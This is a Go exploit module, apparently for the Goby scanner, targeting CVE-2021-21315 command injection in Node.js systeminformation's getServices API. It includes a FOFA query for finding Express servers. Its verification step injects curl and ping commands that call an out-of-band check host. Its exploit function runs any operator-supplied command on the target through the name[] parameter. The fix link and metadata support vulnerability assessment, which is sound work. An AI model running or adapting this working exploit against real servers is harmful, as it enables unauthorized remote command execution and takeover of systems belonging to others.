package exploits

import (
	"fmt"
	"git.gobies.org/goby/goscanner/godclient"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"net/url"
	"strings"
	"time"
)

func init() {
	expJson := `{
    "Name": "Node.js systeminformation getServices Api Remote Command Execution Vulnerability (CVE-2021-21315)",
    "Description": "<p>Systeminformation for Node.js is a backend development kit capable of running JavaScript.</p><p>An arbitrary command execution vulnerability exists in the systeminformation package of Node.js. An attacker can use this vulnerability to execute illegal operating system commands and obtain server permissions.</p>",
    "Impact": "<p>Node.js systeminformation (CVE-2021-21315)</p>",
    "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time: <a href=\"https://github.com/sebhildebrandt/systeminformation/commit/07daa05fb06f24f96297abaa30c2ace8bfd8b525\">https://github.com/sebhildebrandt/systeminformation/commit/07daa05fb06f24f96297abaa30c2ace8bfd8b525</a></p><p>1. Set access policies and whitelist access through security devices such as firewalls.</p><p>2.If not necessary, prohibit public network access to the system.</p>",
    "Product": "Node.js systeminformation",
    "VulType": [
        "Command Execution"
    ],
    "Tags": [
        "Command Execution"
    ],
    "Translation": {
        "CN": {
            "Name": "Node.js systeminformation 环境 getServices 接口任意命令执行漏洞（CVE-2021-21315）",
            "Product": "Node.js systeminformation",
            "Description": "<p>Node.js的systeminformation是一个能够运行JavaScript的后端开发包。</p><p>Node.js的systeminformation包存在任意命令执行漏洞，攻击者可利用该漏洞执行非法操作系统命令，获取服务器权限。</p>",
            "Recommendation": "<p>⼚商已发布了漏洞修复程序，请及时关注更新：<a href=\"https://github.com/sebhildebrandt/systeminformation/commit/07daa05fb06f24f96297abaa30c2ace8bfd8b525\">https://github.com/sebhildebrandt/systeminformation/commit/07daa05fb06f24f96297abaa30c2ace8bfd8b525</a></p><p>1、通过防⽕墙等安全设备设置访问策略，设置⽩名单访问。</p><p>2、如⾮必要，禁⽌公⽹访问该系统。</p>",
            "Impact": "<p>Node.js的systeminformation包存在任意命令执行漏洞，攻击者可利用该漏洞执行非法操作系统命令，获取服务器权限。</p>",
            "VulType": [
                "命令执行"
            ],
            "Tags": [
                "命令执行"
            ]
        },
        "EN": {
            "Name": "Node.js systeminformation getServices Api Remote Command Execution Vulnerability (CVE-2021-21315)",
            "Product": "Node.js systeminformation",
            "Description": "<p>Systeminformation for Node.js is a backend development kit capable of running JavaScript.</p><p>An arbitrary command execution vulnerability exists in the systeminformation package of Node.js. An attacker can use this vulnerability to execute illegal operating system commands and obtain server permissions.</p>",
            "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time: <a href=\"https://github.com/sebhildebrandt/systeminformation/commit/07daa05fb06f24f96297abaa30c2ace8bfd8b525\">https://github.com/sebhildebrandt/systeminformation/commit/07daa05fb06f24f96297abaa30c2ace8bfd8b525</a></p><p>1. Set access policies and whitelist access through security devices such as firewalls.</p><p>2.If not necessary, prohibit public network access to the system.</p>",
            "Impact": "<p>Node.js systeminformation (CVE-2021-21315)</p>",
            "VulType": [
                "Command Execution"
            ],
            "Tags": [
                "Command Execution"
            ]
        }
    },
    "FofaQuery": "banner=\"X-Powered-By: Express\" || header=\"X-Powered-By: Express\"",
    "GobyQuery": "banner=\"X-Powered-By: Express\" || header=\"X-Powered-By: Express\"",
    "Author": "1291904552@qq.com",
    "Homepage": "https://www.npmjs.com/package/systeminformation",
    "DisclosureDate": "2022-01-04",
    "References": [
        "http://www.cnnvd.org.cn/web/xxk/ldxqById.tag?CNNVD=CNNVD-202102-1202"
    ],
    "HasExp": true,
    "Is0day": false,
    "Level": "2",
    "CVSS": "9.0",
    "CVEIDs": [
        "CVE-2021-21315"
    ],
    "CNVD": [],
    "CNNVD": [
        "CNNVD-202102-1202"
    ],
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExpParams": [
        {
            "name": "cmd",
            "type": "input",
            "value": "ping 4rhdvk.dnslog.cn",
            "show": ""
        }
    ],
    "ExpTips": {},
    "AttackSurfaces": {
        "Application": [],
        "Support": [],
        "Service": [],
        "System": [],
        "Hardware": []
    },
    "PocId": "10369"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			checkStr := goutils.RandomHexString(4)
			checkUrl, _ := godclient.GetGodCheckURL(checkStr)
			uri1 := "/api/getServices?name=nginx"
			cfg1 := httpclient.NewGetRequestConfig(uri1)
			cfg1.VerifyTls = false
			cfg1.FollowRedirect = false
			if resp, err := httpclient.DoHttpRequest(u, cfg1); err == nil && resp.StatusCode == 200 && strings.Contains(resp.RawBody, "pcpu") {
				uri2 := fmt.Sprintf("/api/getServices?name[]=$(curl%%20%s)", checkUrl)
				cfg2 := httpclient.NewGetRequestConfig(uri2)
				cfg2.VerifyTls = false
				cfg2.FollowRedirect = false
				httpclient.DoHttpRequest(u, cfg2)
				uri3 := fmt.Sprintf("/api/getServices?name[]=$(ping%%20%s)", checkUrl)
				cfg3 := httpclient.NewGetRequestConfig(uri3)
				cfg3.VerifyTls = false
				cfg3.FollowRedirect = false
				httpclient.DoHttpRequest(u, cfg3)
				return godclient.PullExists(checkStr, time.Second*10)
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			cmd := ss.Params["cmd"].(string)
			uri := fmt.Sprintf("/api/getServices?name[]=$(%s)", url.QueryEscape(cmd))
			cfg := httpclient.NewGetRequestConfig(uri)
			cfg.VerifyTls = false
			cfg.FollowRedirect = false
			if resp, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg); err == nil {
				if resp.StatusCode == 200 {
					expResult.Output = "it is a blind rce,see your dnslog\n" + resp.RawBody
					expResult.Success = true
				}
			}
			return expResult
		},
	))
}
